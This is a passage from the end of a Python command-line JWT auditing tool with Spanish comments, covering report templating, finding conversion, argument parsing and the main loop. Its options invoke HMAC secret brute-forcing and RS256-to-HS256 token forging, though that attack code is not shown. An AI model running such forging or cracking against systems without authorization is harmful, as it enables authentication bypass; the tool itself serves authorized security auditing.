                 word-break:break-all;white-space:pre-wrap;color:#ce93d8;overflow-x:auto;}}
  footer{{margin-top:3rem;color:#444;font-size:.8rem;text-align:center;}}
</style>
</head>
<body>
<header>
  <div class="brand">VampSecure Labs — JWT Audit v{VERSION}</div>
  <p class="meta-bar">Generado: {ts} · Tokens analizados: {len(results)}</p>
</header>
{body}
<footer>VampSecure Studios · VampSecure Labs Security Research Division · Uso exclusivo en auditorías autorizadas</footer>
</body></html>"""


# =============================================================================
# CONVERSOR A INFORME UNIFICADO VSL
# =============================================================================

def _findings_vsl(results: List[AuditResult]) -> list:
    """
    Convierte los AuditResult al formato Finding de vampsec_report.

    Solo se incluyen hallazgos de severidad MEDIUM, HIGH o CRITICAL.
    Los tokens cracked y los tokens manipulados se incluyen como evidencia.

    Parámetros
    ----------
    results : List[AuditResult]  — Resultados de la auditoría JWT

    Retorna
    -------
    List[Finding]  — Lista de hallazgos en formato VSL con prefijo JWT-NNN
    """
    from vampsec_report import Finding as VSLFinding

    INCLUDE = {"CRITICAL", "HIGH", "MEDIUM"}
    vsl = []
    n   = 0

    for r in results:
        tok_label = (r.token[:30] + "..." if len(r.token) > 30 else r.token)
        for f in r.findings:
            if f.severity not in INCLUDE:
                continue
            n += 1
            vsl.append(VSLFinding(
                id          = f"JWT-{n:03d}",
                title       = f.title[:80],
                severity    = f.severity,
                description = f.description,
                evidence    = (f"Token: {tok_label}\n" + f.evidence) if f.evidence else f"Token: {tok_label}",
                affected    = tok_label,
                remediation = f.remediation,
                tags        = ["jwt", "authentication", f.severity.lower()],
            ))

    return vsl


# =============================================================================
# CLI
# =============================================================================

def parse_args() -> argparse.Namespace:
    """Parsea los argumentos de línea de comandos."""
    p = argparse.ArgumentParser(
        prog=TOOL_NAME,
        description=(
            f"VampSecure Labs JWT Audit v{VERSION} — "
            "Análisis de seguridad de JSON Web Tokens: "
            "decodificación, alg=none, RS256→HS256, fuerza bruta de secreto, análisis de claims."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Ejemplos:
  %(prog)s --token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.xxx
  %(prog)s --token <JWT> --wordlist secretos.txt
  %(prog)s --token <JWT> --pubkey pub.pem
  %(prog)s --file tokens.txt --json salida.json --html salida.html
  cat token.txt | %(prog)s --stdin
        """,
    )

    src = p.add_argument_group("Origen del token")
    grp = src.add_mutually_exclusive_group(required=True)
    grp.add_argument("--token",  "-t", metavar="JWT",
                     help="Token JWT a auditar (en línea de comandos)")
    grp.add_argument("--file",   "-f", metavar="FILE",
                     help="Fichero de texto con un token JWT por línea")
    grp.add_argument("--stdin",        action="store_true",
                     help="Leer token(s) de stdin (un token por línea)")

    atk = p.add_argument_group("Opciones de ataque")
    atk.add_argument("--wordlist", "-w", metavar="FILE",
                     help="Wordlist adicional para fuerza bruta del secreto HMAC")
    atk.add_argument("--pubkey", metavar="FILE",
                     help="Clave pública RSA PEM para generar token RS256→HS256")
    atk.add_argument("--no-bruteforce", action="store_true",
                     help="Omitir fase de fuerza bruta de secreto (más rápido)")

    out = p.add_argument_group("Salida")
    out.add_argument("--json", metavar="FILE", help="Guardar resultados en JSON")
    out.add_argument("--html", metavar="FILE", help="Guardar informe HTML dark-theme")
    out.add_argument("--quiet", action="store_true", help="Suprimir banner")

    from vampsec_report import add_report_args
    add_report_args(p)

    return p.parse_args()


def main() -> None:
    """Punto de entrada principal."""
    console.print(BANNER, style="bold magenta")
    args = parse_args()

    # Cargar tokens
    tokens: List[str] = []
    if args.token:
        tokens = [args.token.strip()]
    elif args.file:
        fp = Path(args.file)
        if not fp.exists():
            console.print(f"[bold red]  ERROR: Fichero no encontrado: {args.file}[/]")
            sys.exit(1)
        tokens = [l.strip() for l in fp.read_text(encoding="utf-8").splitlines() if l.strip()]
    elif args.stdin:
        tokens = [l.strip() for l in sys.stdin.readlines() if l.strip()]

    if not tokens:
        console.print("[bold red]  ERROR: No se han proporcionado tokens JWT.[/]")
        sys.exit(1)

    # Cargar wordlist adicional
    wordlist: Optional[List[str]] = None
    if args.wordlist and not args.no_bruteforce:
        wp = Path(args.wordlist)
        if not wp.exists():
            console.print(f"[yellow]  ⚠ Wordlist no encontrada: {args.wordlist}[/]")
        else:
            wordlist = [l.strip() for l in wp.read_text(encoding="utf-8").splitlines() if l.strip()]
            console.print(f"  [dim]Wordlist cargada: {len(wordlist)} secretos[/]")

    # Cargar clave pública
    pubkey_pem: Optional[str] = None
    if args.pubkey:
        pk_path = Path(args.pubkey)
        if not pk_path.exists():
            console.print(f"[yellow]  ⚠ Clave pública no encontrada: {args.pubkey}[/]")
        else:
            pubkey_pem = pk_path.read_text(encoding="utf-8")
            console.print(f"  [dim]Clave pública cargada: {args.pubkey}[/]")

    # Auditar cada token
    results: List[AuditResult] = []
    for i, token in enumerate(tokens, 1):
        if len(tokens) > 1:
            console.print(f"\n[bold cyan]  ── Token {i}/{len(tokens)} ──[/]")

        result = audit_token(
            token,
            wordlist=wordlist if not args.no_bruteforce else None,
            pubkey_pem=pubkey_pem,
        )
        results.append(result)
        print_token_detail(result)

    # Resumen
    total_findings = sum(len(r.findings) for r in results)
    crit = sum(1 for r in results for f in r.findings if f.severity == "CRITICAL")
    high = sum(1 for r in results for f in r.findings if f.severity == "HIGH")
    cracked = sum(1 for r in results if r.cracked_secret is not None)

    sev_style = "bold red" if crit > 0 else ("bold yellow" if high > 0 else "bold green")
    console.print(
        f"\n[{sev_style}]  RESUMEN: {len(results)} token(s) · "
        f"{total_findings} hallazgos · {crit} CRÍTICO · {high} ALTO"
        + (f" · {cracked} secreto(s) descubierto(s)" if cracked else "")
        + "[/]"
    )

    # Exportación JSON
    if args.json:
        Path(args.json).write_text(to_json(results), encoding="utf-8")
        console.print(f"[green]  ✔ JSON guardado: {args.json}[/]")

    # Exportación HTML
    if args.html:
        Path(args.html).write_text(to_html(results), encoding="utf-8")
        console.print(f"[green]  ✔ HTML guardado: {args.html}[/]")

    # Informe unificado VSL
    if getattr(args, "report_html", None) or getattr(args, "report_pdf", None):
        from vampsec_report import VampSecReport, meta_from_args
        meta    = meta_from_args(args, tool=TOOL_NAME, version=VERSION)
        report  = VampSecReport(meta=meta, findings=_findings_vsl(results))
        if args.report_html:
            report.to_html_client(args.report_html)
            console.print(f"[green]  ✔ Informe cliente HTML: {args.report_html}[/]")
        if args.report_pdf:
            report.to_pdf(args.report_pdf)
            console.print(f"[green]  ✔ Informe cliente PDF: {args.report_pdf}[/]")

    # Exit codes para CI/CD
    if crit > 0:
        sys.exit(2)
    elif high > 0:
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[dim]  Auditoría interrumpida.[/]")
        sys.exit(130)
